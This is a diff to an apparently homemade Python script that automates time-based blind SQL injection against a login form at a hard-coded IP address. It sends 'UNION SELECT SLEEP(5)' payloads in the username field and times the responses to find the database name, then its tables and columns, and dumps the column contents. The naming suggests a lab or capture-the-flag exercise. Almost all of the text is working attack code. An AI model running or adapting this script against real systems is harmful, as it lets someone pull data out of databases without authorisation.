@@ -7,17 +7,19 @@ def db_name():
     db = []
     texte = ""
     TIME = 5
-    url = "http://51.15.136.118/pageid.php"
+    global url
+    url = "http://51.15.136.118/login_sqlmap.php/"
     global table 
     table = ""
 
     for letter in dictionary:
-        for num in range(1, 10):
+        for num in range(1, 20):
             usr = "idc"
             nums = ",{}".format(",".join([str(i) for i in range(1, num + 1)]))
             passwd_type = "' UNION SELECT SLEEP(5)" + nums + "" + " where database() like '" + letter + "%' -- "
+            print(passwd_type)
             start_time = time.time()
-            response = requests.post(url, data={'username': usr, 'password': passwd_type})
+            response = requests.post(url, data={'username': passwd_type, 'password': usr})
             end_time = time.time()
             total_time = end_time - start_time
             if total_time >= TIME:
@@ -76,7 +78,6 @@ def table_name(database):
     a=0
     texte = ""
     TIME = 5
-    url = "http://51.15.136.118/pageid.php"
     for i in range(1, 50):
         for j in range(0, len(dictionary)):
             if a > 25:
@@ -132,7 +133,6 @@ def column_name(database, nom_table):
     a=0
     texte = ""
     TIME = 5
-    url = "http://51.15.136.118/pageid.php"
     for i in range(1, 50):
         for j in range(0, len(dictionary)):
             if a > 25:
@@ -187,7 +187,6 @@ def trouver_tab0(nom_table):
     table = ",1,2"
     a = 0
     idk = []
-    url = "http://51.15.136.118/pageid.php"
     for i in range(1, 10):
         for j in range(0, len(dictionary)):
             if a > 34:
@@ -225,7 +224,6 @@ def dump_columns(table, tab0, column_name):
     table = ",1,2"
     a = 0
     z=0
-    url = "http://51.15.136.118/pageid.php"
     idk = []
 
     while z <= (len(tab)):
